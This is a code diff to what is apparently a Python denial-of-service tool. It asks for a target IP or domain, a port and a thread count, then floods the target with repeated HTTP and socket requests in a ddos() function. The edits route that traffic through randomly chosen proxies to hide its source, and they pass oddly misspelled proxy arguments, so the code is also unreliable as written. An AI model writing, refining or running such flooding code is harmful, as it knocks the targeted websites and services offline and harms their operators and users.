@@ -2433,8 +2433,8 @@ ip = str(input(" IP/DOMAIN: "))
 port = int(input(" PORT: "))
 method = str("TCP")
 times = int("200")
-url = (" https:// " + ip )
 threads = int(input(" THREADS: "))
+url = ip
 print("[0] Checking IP ..........")
 print("Attack Send TO " + ip)
 
@@ -2549,8 +2549,8 @@ def ddos():
                     'https://': 'http://'+random.choice(proxz),
                 }
              )
-            client.get(ip, headers=headers)
-            client.get(ip, headers=headers)
+            client.get(ip, headers=headers, proxw=proxy)
+            client.get(ip, headers=headers, proxw=proxy)
             proxy = {
                     'http': 'http://'+str(random.choice(list(proxz))),   
                     'https': 'http://'+str(random.choice(list(proxz))),
@@ -2559,10 +2559,10 @@ def ddos():
             scraper.get(url, proxz=proxy)
             scraper.get(url, proxz=proxy)
             scraper.get(url, proxz=proxy)
-            scraper.get(url=url, headers=headers, allow_redirects=False)
-            scraper.get(url=url, headers=headers, allow_redirects=False)
-            scraper.get(url=url, headers=headers, allow_redirects=False)
-            scraper.get(url=url, headers=headers, allow_redirects=False)
+            scraper.get(url=url, headers=headers, allow_redirects=False, proxz=proxy)
+            scraper.get(url=url, headers=headers, allow_redirects=False, proxz=proxy)
+            scraper.get(url=url, headers=headers, allow_redirects=False, proxz=proxy)
+            scraper.get(url=url, headers=headers, allow_redirects=False, proxz=proxy)
             s.send(data)
             s.send(data)
             s.send(data)
